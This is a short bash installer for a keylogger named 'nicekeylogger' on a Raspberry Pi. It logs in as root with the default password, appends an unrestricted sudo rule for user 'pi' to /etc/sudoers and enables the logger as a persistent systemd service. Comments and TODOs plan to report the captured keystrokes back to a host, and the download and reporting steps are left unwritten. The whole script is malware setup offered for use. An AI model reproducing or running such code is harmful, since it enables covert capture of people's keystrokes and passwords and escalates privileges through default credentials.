#!/bin/bash
# application to install, setup, and run the keylogger.

# CHECK THAT USER CAN ISSUE SUDO
# Totally expects the root user to be an unchanged Raspberry Pi
su - root <<!
raspberry
echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
!

sudo mkdir /nicekl && cd /nicekl/

# DOWNLOAD FILES if they are not already installed
# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py


# SET APPLICATION AS A SERVICE WITH SYSTEMD
# copy nicekeylogger.service to /etc/systemd/system/
systemctl enable nicekeylogger.service
systemctl daemon-reload


# RUN APPLICATION


# REPORT BACK TO HOST
# TODO - decide the period to report back
# TODO - control size of report; only send new content? only send UDP payload? On size == x?

